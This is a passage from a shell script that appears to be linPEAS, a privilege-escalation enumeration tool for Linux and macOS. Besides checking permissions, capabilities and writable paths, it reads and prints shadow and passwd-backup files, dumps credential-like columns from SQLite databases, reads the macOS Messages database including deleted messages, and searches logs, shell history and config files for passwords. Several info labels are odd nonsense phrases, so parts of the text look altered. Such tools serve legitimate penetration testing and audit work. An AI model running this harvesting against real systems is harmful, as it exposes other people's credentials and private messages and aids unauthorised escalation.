          if ! [ "$FAST" ] && [ "$TIMEOUT" ] && [ "$STRACE" ] && [ ! "$SUPERFAST" ]; then
            printf "$ITALIC"
            echo "  --- Trying to execute $sname with strace in order to look for hijackable libraries..."
            timeout 2 "$STRACE" "$sname" 2>&1 | grep -i -E "open|access|no such file" | sed -${E} "s,open|access|No such file,${SED_RED}$ITALIC,g"
            printf "$NC"
            echo ""
          fi
        fi
      fi
    fi
  fi
done;
echo ""

if ! [ "$SEARCH_IN_FOLDER" ] && ! [ "$IAMROOT" ]; then
  print_2title "Checking misconfigurations of ld.so"
  print_info "liddleso"
  printf $ITALIC"/etc/ld.so.conf\n"$NC;
  cat /etc/ld.so.conf 2>/dev/null | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g"
  cat /etc/ld.so.conf 2>/dev/null | while read l; do
    if echo "$l" | grep -q include; then
      ini_path=$(echo "$l" | cut -d " " -f 2)
      fpath=$(dirname "$ini_path")
      if [ "$(find $fpath -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null)" ]; then echo "You have write privileges over $(find $fpath -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null)" | sed -${E} "s,.*,${SED_RED_YELLOW},"; fi
      printf $ITALIC"$fpath\n"$NC | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g"
      for f in $fpath/*; do
        printf $ITALIC"  $f\n"$NC | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g"
        cat "$f" | grep -v "^#" | sed -${E} "s,$ldsoconfdG,${SED_GREEN}," | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g"
      done
    fi
  done
  echo ""
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Capabilities"
  print_info "100 no cap on a stack"
  if [ "$(command -v capsh)" ]; then
    echo "Current env capabilities:"
    (capsh --print 2>/dev/null | grep "Current:" | sed -${E} "s,$capsB,${SED_RED_YELLOW}," ) || echo_not_found "capsh"
    echo "Current proc capabilities:"
    (cat "/proc/$$/status" | grep Cap | sed -${E} "s,.*0000000000000000|CapBnd:	0000003fffffffff,${SED_GREEN},") 2>/dev/null || echo_not_found "/proc/$$/status"
    echo ""
    echo "Parent Shell capabilities:"
    (capsh --decode=0x"$(cat /proc/$PPID/status 2>/dev/null | grep CapEff | awk '{print $2}')" 2>/dev/null) || echo_not_found "capsh"
  else
    echo "Current capabilities:"
    cat /proc/self/status | grep Cap | sed -${E} "s, .*,${SED_RED},g" | sed -${E} "s,0000000000000000|0000003fffffffff,${SED_GREEN},g"
    echo ""
    echo "Shell capabilities:"
    cat /proc/$PPID/status | grep Cap | sed -${E} "s, .*,${SED_RED},g" | sed -${E} "s,0000000000000000|0000003fffffffff,${SED_GREEN},g"
  fi
  echo ""
  echo "Files with capabilities (limited to 50):"
  getcap -r / 2>/dev/null | head -n 50 | while read cb; do
    capsVB_vuln=""
    
    for capVB in $capsVB; do
      capname="$(echo $capVB | cut -d ':' -f 1)"
      capbins="$(echo $capVB | cut -d ':' -f 2)"
      if [ "$(echo $cb | grep -Ei $capname)" ] && [ "$(echo $cb | grep -E $capbins)" ]; then
        echo "$cb" | sed -${E} "s,.*,${SED_RED_YELLOW},"
        capsVB_vuln="1"
        break
      fi
    done
    
    if ! [ "$capsVB_vuln" ]; then
      echo "$cb" | sed -${E} "s,$capsB,${SED_RED},"
    fi

    if ! [ "$IAMROOT" ] && [ -w "$(echo $cb | cut -d" " -f1)" ]; then
      echo "$cb is writable" | sed -${E} "s,.*,${SED_RED},"
    fi
  done
  echo ""
fi

if [ -f "/etc/security/capability.conf" ] || [ "$DEBUG" ]; then
  print_2title "Users with capabilities"
  print_info "users that say that have 100 cap on a stack"
  if [ -f "/etc/security/capability.conf" ]; then
    grep -v '^#\|none\|^$' /etc/security/capability.conf 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED},"
  else echo_not_found "/etc/security/capability.conf"
  fi
  echo ""
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then
  if [ -d "/etc/apparmor.d/" ] && [ -r "/etc/apparmor.d/" ]; then
    print_2title "AppArmor binary profiles"
    ls -l /etc/apparmor.d/ 2>/dev/null | grep -E "^-" | grep "\."
    echo ""
  fi
fi

print_2title "Files with ACLs (limited to 50)"
print_info "cisco ptsd"
if ! [ "$SEARCH_IN_FOLDER" ]; then
  ( (getfacl -t -s -R -p /bin /etc $HOMESEARCH /opt /sbin /usr /tmp /root 2>/dev/null) || echo_not_found "files with acls in searched folders" ) | head -n 70 | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED},"
else
  ( (getfacl -t -s -R -p $SEARCH_IN_FOLDER 2>/dev/null) || echo_not_found "files with acls in searched folders" ) | head -n 70 | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED},"
fi

if [ "$MACPEAS" ] && ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && ! [ "$(command -v getfacl)" ]; then  
  ls -RAle / 2>/dev/null | grep -v "group:everyone deny delete" | grep -E -B1 "\d: " | head -n 70 | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED},"
fi
echo ""

if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title ".sh files in path"
  print_info "sssssh PAFF is sleeping"
  echo $PATH | tr ":" "\n" | while read d; do
    for f in $(find "$d" -name "*.sh" 2>/dev/null); do
      if ! [ "$IAMROOT" ] && [ -O "$f" ]; then
        echo "You own the script: $f" | sed -${E} "s,.*,${SED_RED},"
      elif ! [ "$IAMROOT" ] && [ -w "$f" ]; then 
        echo "You can write script: $f" | sed -${E} "s,.*,${SED_RED_YELLOW},"
      else
        echo $f | sed -${E} "s,$shscripsG,${SED_GREEN}," | sed -${E} "s,$Wfolders,${SED_RED},";
      fi
    done
  done
  echo ""

  broken_links=$(find "$d" -type l 2>/dev/null | xargs file 2>/dev/null | grep broken)
  if [ "$broken_links" ] || [ "$DEBUG" ]; then 
    print_2title "Broken links in path"
    echo $PATH | tr ":" "\n" | while read d; do
      find "$d" -type l 2>/dev/null | xargs file 2>/dev/null | grep broken | sed -${E} "s,broken,${SED_RED},";
    done
    echo ""
  fi
fi

if [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "FIles datetimes inside the firmware (limit 50)"
  find "$SEARCH_IN_FOLDER" -type f -printf "%T+\n" 2>/dev/null | sort | uniq -c | sort | head -n 50
  echo "To find a file with an specific date execute: find \"$SEARCH_IN_FOLDER\" -type f -printf \"%T+ %p\n\" 2>/dev/null | grep \"<date>\""
  echo ""
fi

print_2title "Executable files potentially added by user (limit 70)"
if ! [ "$SEARCH_IN_FOLDER" ]; then
  find / -type f -executable -printf "%T+ %p\n" 2>/dev/null | grep -Ev "000|/site-packages|/python|/node_modules|\.sample|/gems" | sort -r | head -n 70
else
  find "$SEARCH_IN_FOLDER" -type f -executable -printf "%T+ %p\n" 2>/dev/null | grep -Ev "/site-packages|/python|/node_modules|\.sample|/gems" | sort -r | head -n 70
fi
echo ""



if [ "$MACPEAS" ]; then
  print_2title "Unsigned Applications"
  macosNotSigned /System/Applications
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then
  if [ "$(ls /opt 2>/dev/null)" ]; then
    print_2title "Unexpected in /opt (usually empty)"
    ls -la /opt
    echo ""
  fi
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Unexpected in root"
  if [ "$MACPEAS" ]; then
    (find $ROOT_FOLDER -maxdepth 1 | grep -Ev "$commonrootdirsMacG" | sed -${E} "s,.*,${SED_RED},") || echo_not_found
  else
    (find $ROOT_FOLDER -maxdepth 1 | grep -Ev "$commonrootdirsG" | sed -${E} "s,.*,${SED_RED},") || echo_not_found
  fi
  echo ""
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Files (scripts) in /etc/profile.d/"
  print_info "Eld ancient tomes reside within the above"
  if [ ! "$MACPEAS" ] && ! [ "$IAMROOT" ]; then 
    (ls -la /etc/profile.d/ 2>/dev/null | sed -${E} "s,$profiledG,${SED_GREEN},") || echo_not_found "/etc/profile.d/"
    check_critial_root_path "/etc/profile"
    check_critial_root_path "/etc/profile.d/"
  fi
  echo ""
fi


  if ! [ "$SEARCH_IN_FOLDER" ]; then
print_2title "Permissions in init, init.d, systemd, and rc.d"
  print_info "bunch of things"
  if [ ! "$MACPEAS" ] && ! [ "$IAMROOT" ]; then 
    check_critial_root_path "/etc/init/"
    check_critial_root_path "/etc/init.d/"
    check_critial_root_path "/etc/rc.d/init.d"
    check_critial_root_path "/usr/local/etc/rc.d"
    check_critial_root_path "/etc/rc.d"
    check_critial_root_path "/etc/systemd/"
    check_critial_root_path "/lib/systemd/"
  fi

  echo ""
fi


if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_list "Hashes inside passwd file? ........... "
  if grep -qv '^[^:]*:[x\*\!]\|^#\|^$' /etc/passwd /etc/master.passwd /etc/group 2>/dev/null; then grep -v '^[^:]*:[x\*]\|^#\|^$' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi

  print_list "Writable passwd file? ................ "
  if [ -w "/etc/passwd" ]; then echo "/etc/passwd is writable" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  elif [ -w "/etc/pwd.db" ]; then echo "/etc/pwd.db is writable" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  elif [ -w "/etc/master.passwd" ]; then echo "/etc/master.passwd is writable" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  else echo_no
  fi

  print_list "Credentials in fstab/mtab? ........... "
  if grep -qE "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null; then grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi

  print_list "Can I read shadow files? ............. "
  if [ "$(cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db 2>/dev/null)" ]; then cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi

  print_list "Can I read shadow plists? ............ "
  possible_check=""
  (for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; possible_check="1"; fi; done; if ! [ "$possible_check" ]; then echo_no; fi) 2>/dev/null || echo_no

  print_list "Can I write shadow plists? ........... "
  possible_check=""
  (for l in /var/db/dslocal/nodes/Default/users/*; do if [ -w "$l" ];then echo "$l"; possible_check="1"; fi; done; if ! [ "$possible_check" ]; then echo_no; fi) 2>/dev/null || echo_no

  print_list "Can I read opasswd file? ............. "
  if [ -r "/etc/security/opasswd" ]; then cat /etc/security/opasswd 2>/dev/null || echo ""
  else echo_no
  fi

  print_list "Can I write in network-scripts? ...... "
  if ! [ "$IAMROOT" ] && [ -w "/etc/sysconfig/network-scripts/" ]; then echo "You have write privileges on /etc/sysconfig/network-scripts/" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  elif [ "$(find /etc/sysconfig/network-scripts/ '(' -not -type l -and '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' ')' 2>/dev/null)" ]; then echo "You have write privileges on $(find /etc/sysconfig/network-scripts/ '(' -not -type l -and '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' ')' 2>/dev/null)" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  else echo_no
  fi

  print_list "Can I read root folder? .............. "
  (ls -al /root/ 2>/dev/null | grep -vi "total 0") || echo_no
  echo ""
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Searching root files in home dirs (limit 30)"
  (find $HOMESEARCH -user root 2>/dev/null | head -n 30 | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_RED},") || echo_not_found
  echo ""
fi

if ! [ "$IAMROOT" ]; then
  print_2title "Searching folders owned by me containing others files on it (limit 100)"
  (find $ROOT_FOLDER -type d -user "$USER" ! -path "/proc/*" 2>/dev/null | head -n 100 | while read d; do find "$d" -maxdepth 1 ! -user "$USER" \( -type f -or -type d \) -exec dirname {} \; 2>/dev/null; done) | sort | uniq | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed "s,root,${C}[1;13m&${C}[0m,g"
  echo ""
fi

if ! [ "$IAMROOT" ]; then
  print_2title "Readable files belonging to root and readable by me but not world readable"
  (find $ROOT_FOLDER -type f -user root ! -perm -o=r ! -path "/proc/*" 2>/dev/null | grep -v "\.journal" | while read f; do if [ -r "$f" ]; then ls -l "$f" 2>/dev/null | sed -${E} "s,/.*,${SED_RED},"; fi; done) || echo_not_found
  echo ""
fi

print_2title "Modified interesting files in the last 5mins (limit 100)"
find $ROOT_FOLDER -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" ! -path "/private/var/*" 2>/dev/null | grep -v "/linpeas" | head -n 100 | sed -${E} "s,$Wfolders,${SED_RED},"
echo ""

if command -v logrotate >/dev/null && logrotate --version | head -n 1 | grep -Eq "[012]\.[0-9]+\.|3\.[0-9]\.|3\.1[0-7]\.|3\.18\.0"; then 
print_2title "Writable log files (logrotten) (limit 50)"
  print_info "Etch on the tree"
  logrotate --version 2>/dev/null || echo_not_found "logrotate"
  lastWlogFolder="ImPOsSiBleeElastWlogFolder"
  logfind=$(find $ROOT_FOLDER -type f -name "*.log" -o -name "*.log.*" 2>/dev/null | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (act == pre){(cont += 1)} else {cont=0}; if (cont < 3){ print line_init; }; if (cont == "3"){print "#)You_can_write_more_log_files_inside_last_directory"}; pre=act}' | head -n 50)
  printf "%s\n" "$logfind" | while read log; do
    if ! [ "$IAMROOT" ] && [ "$log" ] && [ -w "$log" ] || ! [ "$IAMROOT" ] && echo "$log" | grep -qE "$Wfolders"; then 
      if echo "$log" | grep -q "You_can_write_more_log_files_inside_last_directory"; then printf $ITALIC"$log\n"$NC;
      elif ! [ "$IAMROOT" ] && [ -w "$log" ] && [ "$(command -v logrotate 2>/dev/null)" ] && logrotate --version 2>&1 | grep -qE ' 1| 2| 3.1'; then printf "Writable:$RED $log\n"$NC;
      elif ! [ "$IAMROOT" ] && [ -w "$log" ]; then echo "Writable: $log";
      elif ! [ "$IAMROOT" ] && echo "$log" | grep -qE "$Wfolders" && [ "$log" ] && [ ! "$lastWlogFolder" == "$log" ]; then lastWlogFolder="$log"; echo "Writable folder: $log" | sed -${E} "s,$Wfolders,${SED_RED},g";
      fi
    fi
  done
fi

echo ""

if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Files inside $HOME (limit 20)"
  (ls -la $HOME 2>/dev/null | head -n 23) || echo_not_found
  echo ""

  print_2title "Files inside others home (limit 20)"
  (find $HOMESEARCH -type f 2>/dev/null | grep -v -i "/"$USER | head -n 20) || echo_not_found
  echo ""

  print_2title "Searching installed mail applications"
  ls /bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin /etc 2>/dev/null | grep -Ewi "$mail_apps" | sort | uniq
  echo ""

  print_2title "Mails (limit 50)"
  (find /var/mail/ /var/spool/mail/ /private/var/mail -type f -ls 2>/dev/null | head -n 50 | sed -${E} "s,$sh_usrs,${SED_RED}," | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_GREEN},g" | sed "s,$USER,${SED_RED},g") || echo_not_found
  echo ""

  if [ "$backup_folders" ] || [ "$DEBUG" ]; then
    print_2title "Backup folders"
    printf "%s\n" "$backup_folders" | while read b ; do
      ls -ld "$b" 2> /dev/null | sed -${E} "s,backups|backup,${SED_RED},g";
      ls -l "$b" 2>/dev/null && echo ""
    done
    echo ""
  fi
fi

print_2title "Backup files (limited 100)"
backs=$(find $ROOT_FOLDER -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bak\.*" -o -name "*\.bck" -o -name "*\.bck\.*" -o -name "*\.bk" -o -name "*\.bk\.*" -o -name "*\.old" -o -name "*\.old\.*" \) -not -path "/proc/*" 2>/dev/null)
printf "%s\n" "$backs" | head -n 100 | while read b ; do
  if [ -r "$b" ]; then
    ls -l "$b" | grep -Ev "$notBackup" | grep -Ev "$notExtensions" | sed -${E} "s,backup|bck|\.bak|\.old,${SED_RED},g";
  fi;
done
echo ""

if [ "$MACPEAS" ]; then
  print_2title "Reading messages database"
  sqlite3 $HOME/Library/Messages/chat.db 'select * from message' 2>/dev/null
  sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment' 2>/dev/null
  sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages' 2>/dev/null

fi


if [ "$PSTORAGE_DATABASE" ] || [ "$DEBUG" ]; then
  print_2title "Searching tables inside readable .db/.sql/.sqlite files (limit 100)"
  FILECMD="$(command -v file 2>/dev/null)"
  printf "%s\n" "$PSTORAGE_DATABASE" | while read f; do
    if [ "$FILECMD" ]; then
      echo "Found "$(file "$f") | sed -${E} "s,\.db|\.sql|\.sqlite|\.sqlite3,${SED_RED},g";
    else
      echo "Found $f" | sed -${E} "s,\.db|\.sql|\.sqlite|\.sqlite3,${SED_RED},g";
    fi
  done
  SQLITEPYTHON=""
  echo ""
  printf "%s\n" "$PSTORAGE_DATABASE" | while read f; do
    if ([ -r "$f" ] && [ "$FILECMD" ] && file "$f" | grep -qi sqlite) || ([ -r "$f" ] && [ ! "$FILECMD" ]); then 
      if [ "$(command -v sqlite3 2>/dev/null)" ]; then
        tables=$(sqlite3 $f ".tables" 2>/dev/null)
      elif [ "$(command -v python 2>/dev/null)" ] || [ "$(command -v python3 2>/dev/null)" ]; then
        SQLITEPYTHON=$(command -v python 2>/dev/null || command -v python3 2>/dev/null)
        tables=$($SQLITEPYTHON -c "print('\n'.join([t[0] for t in __import__('sqlite3').connect('$f').cursor().execute('SELECT name FROM sqlite_master WHERE type=\'table\' and tbl_name NOT like \'sqlite_%\';').fetchall()]))" 2>/dev/null)
      else
        tables=""
      fi
      if [ "$tables" ] || [ "$DEBUG" ]; then
          printf $GREEN" -> Extracting tables from$NC $f $DG(limit 20)\n"$NC
          printf "%s\n" "$tables" | while read t; do
          columns=""
          if [ -z "$SQLITEPYTHON" ]; then
            columns=$(sqlite3 $f ".schema $t" 2>/dev/null | grep "CREATE TABLE")
          else
            columns=$($SQLITEPYTHON -c "print(__import__('sqlite3').connect('$f').cursor().execute('SELECT sql FROM sqlite_master WHERE type!=\'meta\' AND sql NOT NULL AND name =\'$t\';').fetchall()[0][0])" 2>/dev/null)
          fi
          INTCOLUMN=$(echo "$columns" | grep -i "username\|passw\|credential\|email\|hash\|salt")
          if [ "$INTCOLUMN" ]; then
            printf ${BLUE}"  --> Found interesting column names in$NC $t $DG(output limit 10)\n"$NC | sed -${E} "s,user.*|credential.*,${SED_RED},g"
            printf "$columns\n" | sed -${E} "s,username|passw|credential|email|hash|salt|$t,${SED_RED},g"
            (sqlite3 $f "select * from $t" || $SQLITEPYTHON -c "print(', '.join([str(x) for x in __import__('sqlite3').connect('$f').cursor().execute('SELECT * FROM \'$t\';').fetchall()[0]]))") 2>/dev/null | head
            echo ""
          fi
        done
      fi
    fi
  done
fi
echo ""

if [ "$MACPEAS" ]; then
  print_2title "Downloaded Files"
  sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 'select LSQuarantineAgentName, LSQuarantineDataURLString, LSQuarantineOriginURLString, date(LSQuarantineTimeStamp + 978307200, "unixepoch") as downloadedDate from LSQuarantineEvent order by LSQuarantineTimeStamp' | sort | grep -Ev "\|\|\|"
fi

##-- IF) Web files
if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Web files?(output limit)"
  ls -alhR /var/www/ 2>/dev/null | head
  ls -alhR /srv/www/htdocs/ 2>/dev/null | head
  ls -alhR /usr/local/www/apache22/data/ 2>/dev/null | head
  ls -alhR /opt/lampp/htdocs/ 2>/dev/null | head
  echo ""
fi

print_2title "All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)"
find $ROOT_FOLDER -type f -iname ".*" ! -path "/sys/*" ! -path "/System/*" ! -path "/private/var/*" -exec ls -l {} \; 2>/dev/null | grep -Ev "$INT_HIDDEN_FILES" | grep -Ev "_history$|\.gitignore|.npmignore|\.listing|\.ignore|\.uuid|\.depend|\.placeholder|\.gitkeep|\.keep|\.keepme" | head -n 70
echo ""

if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)"
  filstmpback=$(find /tmp /var/tmp /private/tmp /private/var/at/tmp /private/var/tmp $backup_folders_row -type f 2>/dev/null | head -n 70)
  printf "%s\n" "$filstmpback" | while read f; do if [ -r "$f" ]; then ls -l "$f" 2>/dev/null; fi; done
  echo ""
fi

if ! [ "$IAMROOT" ]; then
  print_2title "Interesting writable files owned by me or writable by everyone (not in Home) (max 500)"
  print_info "Places you can scribble"
  obmowbe=$(find $ROOT_FOLDER '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null | grep -Ev "$notExtensions" | sort | uniq | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (act == pre){(cont += 1)} else {cont=0}; if (cont < 5){ print line_init; } if (cont == "5"){print "#)You_can_write_even_more_files_inside_last_directory\n"}; pre=act }' | head -n500)
  printf "%s\n" "$obmowbe" | while read entry; do
    if echo "$entry" | grep -q "You_can_write_even_more_files_inside_last_directory"; then printf $ITALIC"$entry\n"$NC;
    elif echo "$entry" | grep -qE "$writeVB"; then
      echo "$entry" | sed -${E} "s,$writeVB,${SED_RED_YELLOW},"
    else
      echo "$entry" | sed -${E} "s,$writeB,${SED_RED},"
    fi
  done
  echo ""
fi

if ! [ "$IAMROOT" ]; then
  print_2title "Interesting GROUP writable files (not in Home) (max 500)"
  print_info "Places the whole gang can scribble"
  for g in $(groups); do
    iwfbg=$(find $ROOT_FOLDER '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null | grep -Ev "$notExtensions" | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (act == pre){(cont += 1)} else {cont=0}; if (cont < 5){ print line_init; } if (cont == "5"){print "#)You_can_write_even_more_files_inside_last_directory\n"}; pre=act }' | head -n500)
    if [ "$iwfbg" ] || [ "$DEBUG" ]; then
      printf "  Group $GREEN$g:\n$NC";
      printf "%s\n" "$iwfbg" | while read entry; do
        if echo "$entry" | grep -q "You_can_write_even_more_files_inside_last_directory"; then printf $ITALIC"$entry\n"$NC;
        elif echo "$entry" | grep -Eq "$writeVB"; then
          echo "$entry" | sed -${E} "s,$writeVB,${SED_RED_YELLOW},"
        else
          echo "$entry" | sed -${E} "s,$writeB,${SED_RED},"
        fi
      done
    fi
  done
  echo ""
fi

if [ "$(history 2>/dev/null)" ] || [ "$DEBUG" ]; then
  print_2title "Searching passwords in history cmd"
  history | grep -Ei "$pwd_inside_history" "$f" 2>/dev/null | sed -${E} "s,$pwd_inside_history,${SED_RED},"
  echo ""
fi

if [ "$PSTORAGE_HISTORY" ] || [ "$DEBUG" ]; then
  print_2title "Searching passwords in history files"
  printf "%s\n" "$PSTORAGE_HISTORY" | while read f; do grep -Ei "$pwd_inside_history" "$f" 2>/dev/null | sed -${E} "s,$pwd_inside_history,${SED_RED},"; done
  echo ""
fi

if [ "$PSTORAGE_PHP_FILES" ] || [ "$DEBUG" ]; then
  print_2title "Searching passwords in config PHP files"
  printf "%s\n" "$PSTORAGE_PHP_FILES" | while read c; do grep -EiI "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" "$c" 2>/dev/null | grep -Ev "function|password.*= ?\"\"|password.*= ?''" | sed '/^.\{150\}./d' | sort | uniq | sed -${E} "s,[pP][aA][sS][sS][wW]|[dD][bB]_[pP][aA][sS][sS],${SED_RED},g"; done
  echo ""
fi

if [ "$PSTORAGE_PASSWORD_FILES" ] || [ "$DEBUG" ]; then
  print_2title "Searching *password* or *credential* files in home (limit 70)"
  (printf "%s\n" "$PSTORAGE_PASSWORD_FILES" | grep -v "/snap/" | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (cont < 3){ print line_init; } if (cont == "3"){print "  #)There are more creds/passwds files in the previous parent folder\n"}; if (act == pre){(cont += 1)} else {cont=0}; pre=act }' | head -n 70 | sed -${E} "s,password|credential,${SED_RED}," | sed "s,There are more creds/passwds files in the previous parent folder,${C}[3m&${C}[0m,") || echo_not_found
  echo ""
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Checking for TTY (sudo/su) passwords in audit logs"
  aureport --tty 2>/dev/null | grep -E "su |sudo " | sed -${E} "s,su|sudo,${SED_RED},g"
  find /var/log/ -type f -exec grep -RE 'comm="su"|comm="sudo"' '{}' \; 2>/dev/null | sed -${E} "s,\"su\"|\"sudo\",${SED_RED},g" | sed -${E} "s,data=.*,${SED_RED},g"
  echo ""
fi

if [ "$DEBUG" ]; then
  print_2title "Searching IPs inside logs (limit 70)"
  (find /var/log/ /private/var/log -type f -exec grep -R -a -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" "{}" \;) 2>/dev/null | grep -v "\.0\.\|:0\|\.0$" | sort | uniq -c | sort -r -n | head -n 70
  echo ""
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Searching passwords inside logs (limit 70)"
  (find /var/log/ /private/var/log -type f -exec grep -R -i "pwd\|passw" "{}" \;) 2>/dev/null | sed '/^.\{150\}./d' | sort | uniq | grep -v "File does not exist:\|script not found or unable to stat:\|\"GET /.*\" 404" | head -n 70 | sed -${E} "s,pwd|passw,${SED_RED},"
  echo ""
fi

if [ "$DEBUG" ]; then
  print_2title "Searching emails inside logs (limit 70)"
  (find /var/log/ /private/var/log -type f -exec grep -I -R -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" "{}" \;) 2>/dev/null | sort | uniq -c | sort -r -n | head -n 70 | sed -${E} "s,$knw_emails,${SED_GREEN},g"
  echo ""
fi




if ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && [ "$TIMEOUT" ]; then
  print_2title "Searching passwords inside key folders (limit 70) - only PHP files"
  if ! [ "$SEARCH_IN_FOLDER" ]; then
    intpwdfiles=$(timeout 150 find $HOMESEARCH /var/www/ /usr/local/www/ $backup_folders_row /tmp /etc /mnt /private -type f -exec grep -RiIE "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" '{}' \; 2>/dev/null)
  else
    intpwdfiles=$(timeout 150 find $SEARCH_IN_FOLDER -type f -exec grep -RiIE "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" '{}' \; 2>/dev/null)
  fi
  printf "%s\n" "$intpwdfiles" | grep -I ".php:" | sed '/^.\{150\}./d' | sort | uniq | grep -iIv "linpeas" | head -n 70 | sed -${E} "s,[pP][wW][dD]|[pP][aA][sS][sS][wW]|[dD][eE][fF][iI][nN][eE],${SED_RED},g"
  echo ""

  print_2title "Searching passwords inside key folders (limit 70) - no PHP files"
  printf "%s\n" "$intpwdfiles" | grep -vI ".php:" | grep -E "^/" | grep ":" | sed '/^.\{150\}./d' | sort | uniq | grep -iIv "linpeas" | head -n 70 | sed -${E} "s,[pP][wW][dD]|[pP][aA][sS][sS][wW]|[dD][eE][fF][iI][nN][eE],${SED_RED},g"
  echo ""

  print_2title "Searching possible password variables inside key folders (limit 140)"
  if ! [ "$SEARCH_IN_FOLDER" ]; then
